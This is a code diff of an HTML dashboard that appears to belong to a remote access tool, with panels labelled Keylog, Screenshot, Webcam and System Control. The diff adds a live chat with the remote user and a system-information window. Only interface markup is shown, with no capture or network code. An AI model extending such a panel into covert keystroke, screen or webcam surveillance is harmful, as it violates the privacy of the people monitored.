@@ -75,7 +75,9 @@
                 <button class="nav-btn" onclick="navigateTo(2)">Keylog</button>
                 <button class="nav-btn" onclick="navigateTo(3)">Screenshot</button>
                 <button class="nav-btn" onclick="navigateTo(4)">Webcam</button>
-                <button class="nav-btn" onclick="navigateTo(5)">System Control</button>
+                <button class="nav-btn" onclick="navigateTo(5)">Chat</button>
+                <button class="nav-btn" onclick="navigateTo(6)">System Info</button>
+                <button class="nav-btn" onclick="navigateTo(7)">System Control</button>
                 <button class="nav-btn" onclick="disconnect()">Disconnect</button>
             </div>
         </div>
@@ -152,6 +154,37 @@
                             <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
                             Your browser does not support the video tag.
                         </video>
+                    </div>
+                </div>
+
+                <!-- Chat Window -->
+                <div class="window">
+                    <div class="window-content chat-window-content">
+                        <h2>Live Chat</h2>
+                        <p style="margin-bottom: 20px; color: #7a7a7a;">Chat directly with the remote user</p>
+        
+                        <div class="chat-interface">
+                            <div class="chat-messages" id="chatMessages">
+                                <div class="chat-bubble system">Chat session started...</div>
+                            </div>
+                            <div class="chat-input-area">
+                                <input type="text" id="chatInput" placeholder="Type a message..." onkeypress="handleChatKey(event)">
+                                <button class="btn-send-chat" onclick="sendChatMessage()">Send</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- System Info Window -->
+                <div class="window">
+                    <div class="window-content">
+                        <h2>Server System Information</h2>
+                        <div class="info-grid" id="systemInfoGrid">
+                            <div class="loading-text">Click refresh to load info...</div>
+                        </div>
+                        <div class="action-buttons" style="margin-top: 20px;">
+                            <button class="action-btn" onclick="fetchSystemInfo()">Refresh Info</button>
+                        </div>
                     </div>
                 </div>
 
